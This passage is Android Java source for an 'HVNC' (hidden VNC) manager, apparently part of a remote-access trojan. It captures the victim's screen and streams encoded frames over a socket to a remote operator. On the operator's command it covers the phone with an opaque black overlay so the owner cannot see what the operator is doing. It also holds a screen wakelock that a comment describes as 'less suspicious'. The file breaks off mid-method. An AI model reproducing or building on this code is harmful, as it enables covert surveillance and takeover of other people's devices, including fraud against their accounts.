package com.fason.app.features.hvnc;

import android.annotation.SuppressLint;
import android.content.Context;
import android.content.Intent;
import android.hardware.display.DisplayManager;
import android.hardware.display.VirtualDisplay;
import android.media.MediaCodec;
import android.media.MediaCodecInfo;
import android.media.MediaCodecList;
import android.media.MediaFormat;
import android.media.projection.MediaProjection;
import android.media.projection.MediaProjectionManager;
import android.os.Build;
import android.os.PowerManager;
import android.os.Handler;
import android.os.HandlerThread;
import android.util.Log;
import android.view.WindowManager;
import android.graphics.PixelFormat;
import android.view.View;
import com.fason.app.core.FasonApp;
import com.fason.app.core.Protocol;
import com.fason.app.core.network.SocketClient;
import com.fason.app.core.network.SocketCommandRouter;
import io.socket.client.Socket;
import org.json.JSONObject;
import java.nio.ByteBuffer;
import java.util.concurrent.BlockingQueue;
import java.util.concurrent.LinkedBlockingQueue;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicInteger;

public final class HVncManager {
    private static final String TAG = "HVncManager";
    private static final int DEFAULT_FPS = 20;
    private static final int DEFAULT_QUALITY = 60;
    private static final int DEFAULT_SCALE_PERCENT = 50;
    private static final int MAX_FRAME_SIZE = 768 * 1024;
    private static final int CHUNK_SIZE = 192 * 1024; // 192KB: most frames at ≤60 quality fit in one chunk
    // v4.0: reduced from 5 to 2 — less buffering = lower latency
    private static final int MAX_DECODE_QUEUE = 2;
    // v4.0: keepalive keyframe request every 30s for 9-hour stream stability
    private static final long KEEPALIVE_INTERVAL_MS = 30_000;
    // v4.0: adaptive bitrate — reduce 15% when queue backs up 3 consecutive checks
    private static final int ADAPTIVE_BACKPRESSURE_THRESHOLD = 3;
    private static final float ADAPTIVE_BITRATE_DOWN_FACTOR = 0.85f;
    private static final float ADAPTIVE_BITRATE_UP_FACTOR   = 1.10f;
    private static final int MIN_BITRATE = 200_000;
    private static final int MAX_BITRATE = 8_000_000;

    private static volatile HVncManager instance;
    private final Object lock = new Object();
    private MediaProjection mediaProjection;
    private VirtualDisplay virtualDisplay;
    private MediaCodec encoder;
    private android.view.Surface encoderInputSurface;
    private HandlerThread encoderThread;
    private Handler encoderHandler;
    private MediaProjection.Callback projectionCallback;
    private volatile boolean streaming = false;
    private volatile int fps = DEFAULT_FPS;
    private volatile int bitrate = 1_500_000;
    private volatile int currentBitrate = 1_500_000;
    private volatile int scalePercent = DEFAULT_SCALE_PERCENT;
    private volatile int screenWidth = 0;
    private volatile int screenHeight = 0;
    private volatile int encodedWidth = 0;
    private volatile int encodedHeight = 0;
    private volatile float inputScaleX = 1f;
    private volatile float inputScaleY = 1f;
    private volatile int iframeInterval = 0;
    private volatile int resultCode = 0;
    private volatile Intent resultData = null;
    private volatile int pendingFps = DEFAULT_FPS;
    private volatile int pendingQuality = DEFAULT_QUALITY;
    private volatile int pendingScale = DEFAULT_SCALE_PERCENT;
    private volatile String pendingCmdId = null;
    private volatile boolean hasPendingStart = false;
    // v4.0: codec mimeType field (h264 or h265)
    private volatile String activeCodecMime = MediaFormat.MIMETYPE_VIDEO_AVC;
    // v4.0: black screen overlay
    private volatile boolean blackScreenActive = false;
    private volatile View blackScreenView = null;
    // Adaptive bitrate backpressure counter
    private final AtomicInteger backpressureCount = new AtomicInteger(0);
    // Screen-on wakelock held during HVNC streaming — prevents VirtualDisplay from going dark
    private volatile android.os.PowerManager.WakeLock streamWakeLock;
    // v4.0: keepalive handler
    private HandlerThread keepaliveThread;
    private Handler keepaliveHandler;

    private final BlockingQueue<EncodedFrame> frameQueue = new LinkedBlockingQueue<>(MAX_DECODE_QUEUE);
    private volatile Thread senderThread = null;
    private volatile boolean senderRunning = false;
    private final Object senderLock     = new Object();
    private final Object blackScreenLock = new Object(); // guards blackScreenView + blackScreenActive
    private io.socket.emitter.Emitter.Listener disconnectListener = null;
    private HandlerThread cbThread = null;
    private volatile boolean restartInProgress = false;
    private volatile boolean stopRequested = false;
    private volatile boolean stopQueued = false;
    private volatile boolean codecConfigSent = false;
    private volatile byte[] cachedAvcC;
    private io.socket.emitter.Emitter.Listener connectListener = null;

    private HVncManager() {}
    private static final class EncodedFrame {
        final byte[] data;
        final long ptsUs;
        final boolean keyframe;
        EncodedFrame(byte[] data, long ptsUs, boolean keyframe) {
            this.data = data;
            this.ptsUs = ptsUs;
            this.keyframe = keyframe;
        }
    }

    public static HVncManager getInstance() {
        if (instance == null) {
            synchronized (HVncManager.class) {
                if (instance == null) instance = new HVncManager();
            }
        }
        return instance;
    }

    // v4.0: check if H.265 encoder is available on this device
    private static boolean isHevcSupported() {
        try {
            MediaCodecList list = new MediaCodecList(MediaCodecList.ALL_CODECS);
            MediaFormat testFormat = MediaFormat.createVideoFormat(MediaFormat.MIMETYPE_VIDEO_HEVC, 1280, 720);
            testFormat.setInteger(MediaFormat.KEY_BIT_RATE, 2_000_000);
            testFormat.setInteger(MediaFormat.KEY_FRAME_RATE, 30);
            testFormat.setInteger(MediaFormat.KEY_COLOR_FORMAT, MediaCodecInfo.CodecCapabilities.COLOR_FormatSurface);
            testFormat.setInteger(MediaFormat.KEY_I_FRAME_INTERVAL, 1);
            String codecName = list.findEncoderForFormat(testFormat);
            return codecName != null;
        } catch (Exception e) {
            return false;
        }
    }

    public void setProjectionResult(int code, Intent data) {
        this.resultCode = code;
        this.resultData = data;
        if (code != 0 && data != null && hasPendingStart) {
            hasPendingStart = false;
            SocketCommandRouter.EXEC.execute(() ->
                start(pendingFps, pendingQuality, pendingScale, pendingCmdId));
        }
    }

    public void onInputAck(boolean completed) {
        Socket socket = SocketClient.getInstance().getSocket();
        if (socket == null) return;
        try {
            JSONObject data = new JSONObject();
            data.put(Protocol.KEY_TYPE, "input_ack");
            data.put("completed", completed);
            data.put(Protocol.KEY_TIMESTAMP, System.currentTimeMillis());
            socket.emit(Protocol.HVNC, data);
        } catch (Exception ignored) {}
    }

    public void setPendingStart(int fps, int quality, int scale, String cmdId) {
        this.pendingFps = fps;
        this.pendingQuality = quality;
        this.pendingScale = scale;
        this.pendingCmdId = cmdId;
        this.hasPendingStart = true;
    }

    public void setIframeInterval(int seconds) {
        iframeInterval = Math.max(0, Math.min(seconds, 10));
    }

    public void clearPendingStart() {
        hasPendingStart = false;
        sendStatus("permission_denied", null);
    }

    public float getInputScaleX() { return inputScaleX; }
    public float getInputScaleY() { return inputScaleY; }
    public boolean hasProjectionPermission() {
        return resultCode != 0 && resultData != null;
    }

    public static boolean needsPermissionRequest() {
        return !getInstance().hasProjectionPermission();
    }

    public static Intent createScreenCaptureIntent() {
        Context ctx = FasonApp.getContext();
        MediaProjectionManager mpm = (MediaProjectionManager) ctx.getSystemService(Context.MEDIA_PROJECTION_SERVICE);
        return mpm.createScreenCaptureIntent();
    }

    private static int qualityToBitrate(int quality) {
        quality = Math.max(10, Math.min(quality, 100));
        return (int) (300_000 + (quality - 10) * (3_000_000 - 300_000) / 90.0);
    }

    // v4.0: adaptive bitrate — reduce when sender queue backs up
    private void adaptBitrate(boolean reduce) {
        if (encoder == null) return;
        try {
            int next;
            if (reduce) {
                next = Math.max(MIN_BITRATE, (int)(currentBitrate * ADAPTIVE_BITRATE_DOWN_FACTOR));
            } else {
                next = Math.min(MAX_BITRATE, (int)(currentBitrate * ADAPTIVE_BITRATE_UP_FACTOR));
            }
            if (next == currentBitrate) return;
            currentBitrate = next;
            android.os.Bundle params = new android.os.Bundle();
            params.putInt(MediaCodec.PARAMETER_KEY_VIDEO_BITRATE, currentBitrate);
            encoder.setParameters(params);
            Log.d(TAG, "Adaptive bitrate → " + currentBitrate / 1000 + "kbps");
        } catch (Exception ignored) {}
    }

    // v4.0: keepalive runnable — requests sync frame every 30s
    private final Runnable keepaliveTask = new Runnable() {
        @Override
        public void run() {
            if (!streaming || encoder == null) return;
            try {
                android.os.Bundle params = new android.os.Bundle();
                params.putInt(MediaCodec.PARAMETER_KEY_REQUEST_SYNC_FRAME, 0);
                encoder.setParameters(params);
                Log.d(TAG, "HVNC keepalive keyframe requested");
            } catch (Exception ignored) {}
            if (streaming && keepaliveHandler != null) {
                keepaliveHandler.postDelayed(this, KEEPALIVE_INTERVAL_MS);
            }
        }
    };

    private void startKeepalive() {
        if (keepaliveThread == null || !keepaliveThread.isAlive()) {
            keepaliveThread = new HandlerThread("HVncKeepalive");
            keepaliveThread.start();
            keepaliveHandler = new Handler(keepaliveThread.getLooper());
        }
        keepaliveHandler.removeCallbacks(keepaliveTask);
        keepaliveHandler.postDelayed(keepaliveTask, KEEPALIVE_INTERVAL_MS);
    }

    private void stopKeepalive() {
        if (keepaliveHandler != null) keepaliveHandler.removeCallbacks(keepaliveTask);
        if (keepaliveThread != null) {
            try { keepaliveThread.quitSafely(); } catch (Exception ignored) {}
            keepaliveThread = null;
        }
        keepaliveHandler = null;
    }


    // ── Screen-on management ──────────────────────────────────────────────────

    /**
     * Acquire a SCREEN_DIM_WAKE_LOCK during streaming. This keeps the display
     * active so VirtualDisplay.AUTO_MIRROR continues capturing frames. Devices
     * that let the screen go off stop mirroring → pure black frames for the viewer.
     */
    private void acquireStreamWakeLock() {
        try {
            if (streamWakeLock != null && streamWakeLock.isHeld()) return;
            android.os.PowerManager pm = (android.os.PowerManager)
                FasonApp.getContext().getSystemService(Context.POWER_SERVICE);
            if (pm == null) return;
            // SCREEN_DIM_WAKE_LOCK: keeps screen on at minimum brightness (less suspicious
            // than FULL_WAKE_LOCK, and sufficient for VirtualDisplay mirroring).
            @SuppressWarnings("deprecation")
            android.os.PowerManager.WakeLock wl = pm.newWakeLock(
                android.os.PowerManager.SCREEN_DIM_WAKE_LOCK | android.os.PowerManager.ON_AFTER_RELEASE,
                "fason:hvnc_stream"
            );
            wl.setReferenceCounted(false);
            wl.acquire(10 * 60 * 60 * 1000L); // 10-hour max; released on stop
            streamWakeLock = wl;
        } catch (Exception e) {
            Log.w(TAG, "streamWakeLock acquire failed: " + e.getMessage());
        }
    }

    private void releaseStreamWakeLock() {
        try {
            if (streamWakeLock != null && streamWakeLock.isHeld()) {
                streamWakeLock.release();
            }
        } catch (Exception ignored) {}
        streamWakeLock = null;
    }

    // v4.0: black screen — put a black overlay on device screen
    public void setBlackScreen(boolean on, String cmdId) {
        // All state mutations guarded by blackScreenLock. UI work posted to main thread
        // from inside the lock so we capture a consistent snapshot of the view reference.
        synchronized (blackScreenLock) {
            try {
                Context ctx = FasonApp.getContext();
                WindowManager wm = (WindowManager) ctx.getSystemService(Context.WINDOW_SERVICE);
                if (wm == null) { sendBlackScreenResult(false, "no_wm", cmdId); return; }

                int type = Build.VERSION.SDK_INT >= Build.VERSION_CODES.O
                    ? WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
                    : WindowManager.LayoutParams.TYPE_SYSTEM_ALERT;

                if (on && blackScreenView == null) {
                    View v = new View(ctx);
                    v.setBackgroundColor(0xFF000000);
                    blackScreenView = v;
                    WindowManager.LayoutParams params = new WindowManager.LayoutParams(
                        WindowManager.LayoutParams.MATCH_PARENT,
                        WindowManager.LayoutParams.MATCH_PARENT,
                        type,
                        WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE
                            | WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE
                            | WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN,
                        PixelFormat.OPAQUE);
                    params.alpha = 1.0f;
                    new Handler(android.os.Looper.getMainLooper()).post(() -> {
                        synchronized (blackScreenLock) {
                            if (blackScreenView != v) return; // superseded
                            try {
                                wm.addView(v, params);
                                blackScreenActive = true;
                                sendBlackScreenResult(true, null, cmdId);
                            } catch (Exception e) {
                                blackScreenView  = null;
                                blackScreenActive = false;
                                sendBlackScreenResult(false, e.getMessage(), cmdId);
                            }
                        }
                    });
                } else if (!on && blackScreenView != null) {
                    final View v = blackScreenView;
                    blackScreenView  = null;
                    blackScreenActive = false;
                    new Handler(android.os.Looper.getMainLooper()).post(() -> {
                        try { wm.removeView(v); } catch (Exception ignored) {}
                        sendBlackScreenResult(false, null, cmdId);
                    });
                } else {
                    sendBlackScreenResult(on, null, cmdId);
                }
            } catch (Exception e) {
                sendBlackScreenResult(false, e.getMessage(), cmdId);
            }
        }
    }

    private void sendBlackScreenResult(boolean active, String error, String cmdId) {
        Socket socket = SocketClient.getInstance().getSocket();
        if (socket == null) return;
        try {
            JSONObject d = new JSONObject();
            d.put(Protocol.KEY_TYPE, "black_screen_result");
            d.put(Protocol.KEY_BLACK_SCREEN, active);
            if (error != null) d.put(Protocol.KEY_ERROR, error);
            if (cmdId != null) d.put(Protocol.KEY_CMD_ID, cmdId);
            socket.emit(Protocol.HVNC, d);
        } catch (Exception ignored) {}
    }

    @SuppressLint("WrongConstant")
    public void start(int fps, int quality, int scalePercent, String cmdId) {
        synchronized (lock) {
            if (streaming) {
                sendStatus("already_streaming", cmdId);
                return;
            }
            if (!hasProjectionPermission()) {
                sendStatus("no_permission", cmdId);
                return;
            }
            if (restartInProgress) {
                sendStatus("restart_in_progress", cmdId);
                return;
            }
            this.fps = Math.max(1, Math.min(fps > 0 ? fps : DEFAULT_FPS, 60));
            this.bitrate = qualityToBitrate(quality);
            this.currentBitrate = this.bitrate;
            this.scalePercent = Math.max(10, Math.min(scalePercent > 0 ? scalePercent : DEFAULT_SCALE_PERCENT, 100));
            this.iframeInterval = Math.max(0, Math.min(this.iframeInterval, 10));
            // Use H264 by default. H265 only if explicitly set via setCodecPreference()
            // before calling start(). Browser H265 WebCodecs support is unreliable across
            // platforms; H264 works everywhere. Device still reports activeCodecMime to frontend.
            if (this.activeCodecMime.equals(MediaFormat.MIMETYPE_VIDEO_HEVC) && !isHevcSupported()) {
                this.activeCodecMime = MediaFormat.MIMETYPE_VIDEO_AVC;
            }
            Log.i(TAG, "Using codec: " + activeCodecMime);
            try {
                Context ctx = FasonApp.getContext();
                com.fason.app.service.MainService svc = com.fason.app.service.MainService.getInstance();
                if (svc != null) svc.upgradeForMediaProjection();
                MediaProjectionManager mpm = (MediaProjectionManager) ctx.getSystemService(Context.MEDIA_PROJECTION_SERVICE);
                mediaProjection = mpm.getMediaProjection(resultCode, resultData);
                if (mediaProjection == null) {
                    sendStatus("projection_failed", cmdId);
                    stopInternal(true);
                    return;
                }
                cbThread = new HandlerThread("HVncMpCb");
                cbThread.start();
                final Handler cbHandler = new Handler(cbThread.getLooper());
                projectionCallback = new MediaProjection.Callback() {
                    @Override
                    public void onStop() {
                        Log.w(TAG, "Projection stopped");
                        if (streaming) SocketCommandRouter.EXEC.execute(() -> stop());
                    }
                };
                mediaProjection.registerCallback(projectionCallback, cbHandler);
                encoderThread = new HandlerThread("HVncEncoder");
                encoderThread.start();
                encoderHandler = new Handler(encoderThread.getLooper());
                int[] dims = computeDimensions(ctx);
                int targetWidth = dims[0], targetHeight = dims[1];
                encodedWidth = targetWidth;
                encodedHeight = targetHeight;
                inputScaleX = (float) screenWidth / targetWidth;
                inputScaleY = (float) screenHeight / targetHeight;
                if (!createAndStartEncoder(targetWidth, targetHeight)) {
                    // v4.0: if preferred codec failed, retry with H.264
                    if (!activeCodecMime.equals(MediaFormat.MIMETYPE_VIDEO_AVC)) {
                        Log.w(TAG, "HEVC failed, falling back to H.264");
                        activeCodecMime = MediaFormat.MIMETYPE_VIDEO_AVC;
                        if (!createAndStartEncoder(targetWidth, targetHeight)) {
                            sendStatus("encoder_failed", cmdId);
                            stopInternal(true);
                            return;
                        }
                    } else {
                        sendStatus("encoder_failed", cmdId);
                        stopInternal(true);
                        return;
                    }
                }
                if (virtualDisplay == null) {
                    sendStatus("virtual_display_failed", cmdId);
                    stopInternal(true);
                    return;
                }
                codecConfigSent = false;
                stopRequested = false;
                stopQueued = false;
                frameQueue.clear();
                backpressureCount.set(0);
                Socket socket = SocketClient.getInstance().getSocket();
                if (socket != null) {
                    disconnectListener = args -> {
                        if (streaming || restartInProgress) {
                            Log.w(TAG, "Socket disconnected, stopping HVNC");
                            SocketCommandRouter.EXEC.execute(() -> stop());
                        }
                    };
                    socket.on(Socket.EVENT_DISCONNECT, disconnectListener);
                    connectListener = args -> {
                        codecConfigSent = false;
                        if (cachedAvcC != null) {
                            sendCodecConfig(cachedAvcC);
                        }
                        if (encoder != null) {
                            try {
                                android.os.Bundle params = new android.os.Bundle();
                                params.putInt(MediaCodec.PARAMETER_KEY_REQUEST_SYNC_FRAME, 0);
                                encoder.setParameters(params);
                            } catch (Exception ignored) {}
                        }
                    };
                    socket.on(Socket.EVENT_CONNECT, connectListener);
                }
                streaming = true;
                startSenderThread();
                startKeepalive();
                acquireStreamWakeLock(); // keep display alive during capture
                sendStatus("streaming", cmdId);
                Log.i(TAG, "HVNC streaming " + targetWidth + "x" + targetHeight
                    + " @" + this.fps + "fps " + (this.currentBitrate / 1000) + "kbps ["
                    + (activeCodecMime.contains("hevc") ? "H.265" : "H.264") + "]");
            } catch (Exception e) {
                Log.e(TAG, "HVNC start failed", e);
                sendStatus("error: " + e.getMessage(), cmdId);
                stopInternal(true);
            }
        }
    }

    public void stop() {
        synchronized (lock) {
            if (restartInProgress) {
                // Signal the in-progress restart to abort and tear down when it checks
                stopRequested = true;
                return;
            }
            restartInProgress = false; // defensive clear — ensures no stuck state
            if (!streaming && mediaProjection == null && encoder == null
                && encoderThread == null && cbThread == null && disconnectListener == null) {
                return;
            }
            stopInternal(true);
        }
    }

    // v4.0: retain projection token across stops (for faster restart)
    public void retainToken() {
        synchronized (lock) {
            boolean wasStreaming = streaming;
            streaming = false;
            stopRequested = false;
            stopQueued = false;
            codecConfigSent = false;
            stopKeepalive();
            stopSenderThread();
            frameQueue.clear();
            releaseEncoderAndDisplay();
            if (encoderThread != null) { encoderThread.quitSafely(); encoderThread = null; }
            encoderHandler = null;
            try {
                if (mediaProjection != null) {
                    Socket socket = SocketClient.getInstance().getSocket();
                    if (socket != null) {
                        if (disconnectListener != null) socket.off(Socket.EVENT_DISCONNECT, disconnectListener);
                        if (connectListener != null) socket.off(Socket.EVENT_CONNECT, connectListener);
                    }
                    disconnectListener = null;
                    connectListener = null;
                    if (projectionCallback != null) {
                        try { mediaProjection.unregisterCallback(projectionCallback); } catch (Exception ignored) {}
                    }
                    projectionCallback = null;
                    mediaProjection.stop();
                }
            } catch (Exception ignored) {}
            mediaProjection = null;
            if (cbThread != null) { try { cbThread.quitSafely(); } catch (Exception ignored) {} cbThread = null; }
            releaseStreamWakeLock();
            // NOTE: token (resultCode / resultData) is deliberately NOT cleared
            com.fason.app.service.MainService svc = com.fason.app.service.MainService.getInstance();
            if (svc != null) svc.downgradeFromMediaProjection();
            if (wasStreaming) sendStatus("stopped", null);
        }
    }

    private void stopInternal(boolean clearToken) {
        boolean wasStreaming = streaming;
        streaming = false;
        stopRequested = false;
        stopQueued = false;
        codecConfigSent = false;
        stopKeepalive();
        stopSenderThread();
        frameQueue.clear();
        releaseEncoderAndDisplay();
        if (encoderThread != null) { encoderThread.quitSafely(); encoderThread = null; }
        encoderHandler = null;
        try {
            if (mediaProjection != null) {
                Socket socket = SocketClient.getInstance().getSocket();
                if (socket != null) {
                    if (disconnectListener != null) socket.off(Socket.EVENT_DISCONNECT, disconnectListener);
                    if (connectListener != null) socket.off(Socket.EVENT_CONNECT, connectListener);
                }
                disconnectListener = null;
                connectListener = null;
                if (projectionCallback != null) {
                    try { mediaProjection.unregisterCallback(projectionCallback); } catch (Exception ignored) {}
                }
                projectionCallback = null;
                mediaProjection.stop();
            }
        } catch (Exception ignored) {}
        mediaProjection = null;
        if (cbThread != null) { try { cbThread.quitSafely(); } catch (Exception ignored) {} cbThread = null; }
        if (clearToken) {
            resultCode = 0;
            resultData = null;
            inputScaleX = 1f;
            inputScaleY = 1f;
            iframeInterval = 0;
        }
        releaseStreamWakeLock();
        // v4.0: remove black screen if streaming stops
        // Clean up black screen overlay if it's up — must be sync-guarded
        synchronized (blackScreenLock) {
            if (blackScreenView != null) {
                final View v = blackScreenView;
                blackScreenView  = null;
                blackScreenActive = false;
                new Handler(android.os.Looper.getMainLooper()).post(() -> {
                    try {
                        Context c = FasonApp.getContext();
                        WindowManager w = (WindowManager) c.getSystemService(Context.WINDOW_SERVICE);
                        if (w != null) w.removeView(v);
                    } catch (Exception ignored) {}
                });
            }
        }
        com.fason.app.service.MainService svc = com.fason.app.service.MainService.getInstance();
        if (svc != null) svc.downgradeFromMediaProjection();
        if (wasStreaming && clearToken) sendStatus("stopped", null);
    }

    public void restart(int fps, int quality, int scalePercent, String cmdId) {
        synchronized (lock) {
            if (!streaming) {
                Log.w(TAG, "Restart called, not streaming");
                return;
            }
            if (restartInProgress) {
                Log.d(TAG, "Restart in progress, skipping");
                return;
            }
            restartInProgress = true;
            stopRequested = false;
            try {
                this.fps = Math.max(1, Math.min(fps > 0 ? fps : this.fps, 60));
                this.bitrate = qualityToBitrate(quality);
                this.currentBitrate = this.bitrate;
                this.scalePercent = Math.max(10, Math.min(scalePercent > 0 ? scalePercent : this.scalePercent, 100));
                streaming = false;
                stopKeepalive();
                stopSenderThread();
                frameQueue.clear();
                backpressureCount.set(0);
                releaseEncoderAndDisplay();
                Context ctx = FasonApp.getContext();
                int[] dims = computeDimensions(ctx);
                int targetWidth = dims[0], targetHeight = dims[1];
                encodedWidth = targetWidth;
                encodedHeight = targetHeight;
                inputScaleX = (float) screenWidth / targetWidth;
                inputScaleY = (float) screenHeight / targetHeight;
                if (!createAndStartEncoder(targetWidth, targetHeight)) {
                    if (!activeCodecMime.equals(MediaFormat.MIMETYPE_VIDEO_AVC)) {
                        activeCodecMime = MediaFormat.MIMETYPE_VIDEO_AVC;
                        if (!createAndStartEncoder(targetWidth, targetHeight)) {
                            sendStatus("encoder_failed", cmdId);
                            stopInternal(false);
                            return;
                        }
                    } else {
                        sendStatus("encoder_failed", cmdId);
                        stopInternal(false);
                        return;
                    }
                }
                if (virtualDisplay == null) {
                    sendStatus("virtual_display_failed", cmdId);
                    stopInternal(false);
                    return;
                }
                if (stopRequested) {
                    stopInternal(false);
                    return;
                }
                codecConfigSent = false;
                streaming = true;
                startSenderThread();
                startKeepalive();
                acquireStreamWakeLock();
                sendStatus("streaming", cmdId);
            } catch (Exception e) {
                Log.e(TAG, "Restart failed", e);
                sendStatus("error: restart " + e.getMessage(), cmdId);
                stopInternal(false);
            } finally {
                restartInProgress = false;
            }
        }
    }

    private int[] computeDimensions(Context ctx) {
        try {
            android.view.WindowManager wm =
                (android.view.WindowManager) ctx.getSystemService(Context.WINDOW_SERVICE);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                android.view.WindowMetrics wm2 = wm.getCurrentWindowMetrics();
                android.graphics.Rect bounds = wm2.getBounds();
                screenWidth  = bounds.width();
                screenHeight = bounds.height();
            } else {
                android.util.DisplayMetrics metrics = new android.util.DisplayMetrics();
                //noinspection deprecation
                wm.getDefaultDisplay().getRealMetrics(metrics);
                screenWidth  = metrics.widthPixels;
                screenHeight = metrics.heightPixels;
            }
        } catch (Exception e) {
            Log.w(TAG, "computeDimensions display query failed: " + e.getMessage());
        }
        // Hard fallback — avoids 0/NaN when display query fails before first frame
        if (screenWidth  <= 0) screenWidth  = 1080;
        if (screenHeight <= 0) screenHeight = 1920;
        double scale = Math.max(10, Math.min(this.scalePercent, 100)) / 100.0;
        int targetWidth  = Math.max(2, ((int)(screenWidth  * scale)) & ~1);
        int targetHeight = Math.max(2, ((int)(screenHeight * scale)) & ~1);
        return new int[] { targetWidth, targetHeight };
    }

    private boolean createAndStartEncoder(int targetWidth, int targetHeight) {
        // Profile fallback array for H264: try best first, fall back on encode failure
        int[] h264Profiles = activeCodecMime.equals(MediaFormat.MIMETYPE_VIDEO_AVC)
            ? new int[]{
                MediaCodecInfo.CodecProfileLevel.AVCProfileConstrainedBaseline,
                MediaCodecInfo.CodecProfileLevel.AVCProfileBaseline,
                -1 // -1 = don't set profile (let encoder choose)
              }
            : new int[]{ -1 };
        boolean encoderStarted = false;
        for (int profileAttempt : h264Profiles) {
        try {
            MediaFormat format = MediaFormat.createVideoFormat(activeCodecMime, targetWidth, targetHeight);
            format.setInteger(MediaFormat.KEY_COLOR_FORMAT, MediaCodecInfo.CodecCapabilities.COLOR_FormatSurface);
            format.setInteger(MediaFormat.KEY_BIT_RATE, this.currentBitrate);
            format.setInteger(MediaFormat.KEY_FRAME_RATE, this.fps);
            format.setInteger(MediaFormat.KEY_I_FRAME_INTERVAL, iframeInterval);
            // Operating rate: tells the encoder how many frames/sec it should expect.
            // Without this, the encoder may throttle itself on static content.
            format.setInteger(MediaFormat.KEY_OPERATING_RATE, this.fps);
            // Capture rate: informs the VirtualDisplay surface producer of the expected rate.
            format.setInteger(MediaFormat.KEY_CAPTURE_RATE, this.fps);
            // Repeat previous frame after 1 second of no new input — prevents encoder
            // stalls on completely static screens (prevents 0fps on idle screens).
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                format.setLong(MediaFormat.KEY_REPEAT_PREVIOUS_FRAME_AFTER, 1_000_000L);
            }
            // H264-specific encoder tuning
            if (activeCodecMime.equals(MediaFormat.MIMETYPE_VIDEO_AVC)) {
                if (iframeInterval > 0 && Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                    format.setInteger(MediaFormat.KEY_INTRA_REFRESH_PERIOD, Math.max(1, this.fps));
                }
                // Set profile only when a specific one was requested in the fallback loop
                if (profileAttempt >= 0) {
                    format.setInteger(MediaFormat.KEY_PROFILE, profileAttempt);
                    format.setInteger(MediaFormat.KEY_LEVEL, MediaCodecInfo.CodecProfileLevel.AVCLevel31);
                }
            }
            // Low-latency mode (API 30+)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                format.setInteger(MediaFormat.KEY_LOW_LATENCY, 1);
            }
            // Real-time priority (API 31+)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                format.setInteger(MediaFormat.KEY_PRIORITY, 0);
            }
            // Qualcomm zero-latency extension
            try { format.setInteger("vendor.qti-ext-enc-low-latency.enable", 1); } catch (Exception ignored) {}
            // MediaTek low-latency extension
            try { format.setInteger("vendor.mtk-ext-enc-low-latency.enable", 1); } catch (Exception ignored) {}
            encoder = MediaCodec.createEncoderByType(activeCodecMime);
            encoder.setCallback(new EncoderCallback(), encoderHandler);
            encoder.configure(format, null, null, MediaCodec.CONFIGURE_FLAG_ENCODE);
            encoderInputSurface = encoder.createInputSurface();
            encoder.start();
            Context ctx = FasonApp.getContext();
            int densityDpi = ctx.getResources().getDisplayMetrics().densityDpi;
            virtualDisplay = mediaProjection.createVirtualDisplay(
                "HVncDisplay", targetWidth, targetHeight, densityDpi,
                DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
                encoderInputSurface, null, null
            );
            encoderStarted = virtualDisplay != null;
            if (encoderStarted) return true;
            Log.w(TAG, "Encoder start failed for profile=" + profileAttempt + ", trying next");
            releaseEncoderAndDisplay();
        } catch (Exception e) {
            Log.w(TAG, "Encoder creation attempt failed (profile=" + profileAttempt + "): " + e.getMessage());
            releaseEncoderAndDisplay();
        }
        } // end profile retry loop
        Log.e(TAG, "All encoder attempts failed for " + activeCodecMime);
        return false;
    }

    private void releaseEncoderAndDisplay() {
        try { if (virtualDisplay != null) virtualDisplay.release(); } catch (Exception ignored) {}
        virtualDisplay = null;
        try { if (encoderInputSurface != null) encoderInputSurface.release(); } catch (Exception ignored) {}
        encoderInputSurface = null;
        try { if (encoder != null) encoder.stop(); } catch (Exception ignored) {}
        try { if (encoder != null) encoder.release(); } catch (Exception ignored) {}
        encoder = null;
    }

    private final class EncoderCallback extends MediaCodec.Callback {
        @Override
        public void onInputBufferAvailable(MediaCodec codec, int index) {}
        @Override
        public void onOutputBufferAvailable(MediaCodec codec, int index, MediaCodec.BufferInfo info) {
            ByteBuffer outBuf = codec.getOutputBuffer(index);
            if (outBuf == null) { codec.releaseOutputBuffer(index, false); return; }
            if ((info.flags & MediaCodec.BUFFER_FLAG_CODEC_CONFIG) != 0) {
                byte[] config = new byte[info.size];
                outBuf.position(info.offset);
                outBuf.limit(info.offset + info.size);
                outBuf.get(config);
                sendCodecConfig(config);
                codec.releaseOutputBuffer(index, false);
                return;
            }
            if (info.size > 0 && streaming) {
                byte[] annexB = new byte[info.size];
                outBuf.position(info.offset);
                outBuf.limit(info.offset + info.size);
                outBuf.get(annexB);
                byte[] avcc = annexBToLengthPrefixed(annexB);
                if (avcc == null) { codec.releaseOutputBuffer(index, false); return; }
                boolean keyframe = (info.flags & MediaCodec.BUFFER_FLAG_KEY_FRAME) != 0;
                EncodedFrame frame = new EncodedFrame(avcc, info.presentationTimeUs, keyframe);
                // v4.0: drop oldest frame if queue is full (prefer new over old)
                if (!frameQueue.offer(frame)) {
                    frameQueue.poll(); // drop oldest
                    frameQueue.offer(frame);
                }
            }
            codec.releaseOutputBuffer(index, false);
        }
        @Override
        public void onError(MediaCodec codec, MediaCodec.CodecException e) {
            Log.e(TAG, "Encoder error", e);
            sendStatus("error: encoder " + e.getErrorCode(), null);
            if (!stopQueued) {
                stopQueued = true;
                SocketCommandRouter.EXEC.execute(() -> stop());
            }
        }
        @Override
        public void onOutputFormatChanged(MediaCodec codec, MediaFormat format) {
            // For H265: csd-0 contains VPS+SPS+PPS already in annex-B format on most devices.
            // For H264: csd-0=SPS, csd-1=PPS. Both paths go through sendCodecConfig() which
            // routes to the correct box format builder.
            ByteBuffer csd0 = format.getByteBuffer("csd-0");
            ByteBuffer csd1 = format.getByteBuffer("csd-1");
            if (csd0 != null) {
                try {
                    byte[] startCode = { 0x00, 0x00, 0x00, 0x01 };
                    java.io.ByteArrayOutputStream bos = new java.io.ByteArrayOutputStream();
                    // Prepend start code if not already present
                    ByteBuffer d0 = csd0.duplicate();
                    byte[] b0 = new byte[d0.remaining()];
                    d0.get(b0);
